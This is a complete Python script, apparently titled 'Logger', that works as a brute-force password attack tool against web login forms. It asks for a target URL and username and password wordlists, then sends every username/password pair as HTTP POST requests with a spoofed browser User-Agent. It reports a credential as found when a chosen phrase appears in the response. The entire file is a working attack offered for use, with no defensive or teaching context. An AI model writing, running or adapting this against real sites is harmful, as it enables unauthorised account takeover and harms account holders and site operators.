from os import system
import requests
print("""

	██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
	██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
	██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
	██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
	███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
	╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
	                                                   

	                                - Author: Ian Wright
""")
url = input('brute > Enter URL: ')

choice = input('brute > \n\t 1) Username wordlist \n\t 2) Username (user defined) \n\t choice:')
grep_word = input('brute> Enter any phrase to grep after the login \n\t:')

def enter_userlist():
	username_file = input('brute> Enter user_list path:')
	return username_file


def enter_passlist():
	password_file = input('brute> Enter password_list path:')
	return password_file


def send_request(_url_,_data_):
	headers = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'}
	with requests.Session() as s:
		http = s.post(_url_, _data_, headers = headers, timeout=60)
		return http.text

def main():
	if int(choice) == 1:
		print("\n [Using Username & Password wordlists]\n")
		userfile = enter_userlist()
		passfile = enter_passlist()
		if "." not in userfile and "." not in passfile:
			print('brute > you might have entered wrong path')
			userfile = enter_userlist()
			passfile = enter_passlist()
		else:
			with open(userfile, 'r') as u:
				usernames = u.readlines()
				with open(passfile, 'r') as p:
					passwords = p.readlines()		
					for user in usernames:
						_user_ = user.replace('\n', '')
						for password in passwords:
							_pass_ = password.replace('\n', '')
							data_payload = {'username':_user_, 'password':_pass_,'submit':''}
							request = send_request(url, data_payload)
							if grep_word in request:
								print(f'\n[ * ] FOUND PASSWORD ==> [username ="{_user_}"] [password = "{_pass_}"]')
								break
							else:
								print(f'TRIED [username ="{_user_}"] [password = "{_pass_}"] = Invalid')
	else:
		print("\n [Using Only a Password wordlist]\n")
		username = input('brute> Username: ')
		passfile = enter_passlist()

		with open(passfile, 'r') as f:
			passwords = f.readlines()
			for passkey in passwords:
				__pass__ = passkey.replace('\n','')
				data_payload = {'username':username, 'password':__pass__,'submit':''}
				request = send_request(url, data_payload)
				if grep_word in request:
					print(f'\n[ * ] FOUND PASSWORD ==> [username ="{username}"] [password = "{__pass__}"]')
					break
				else:
					print(f'TRIED [username ="{username}"] [password = "{__pass__}"] = Invalid')

try:
	main()
except ValueError:
	system('clear')
	main()

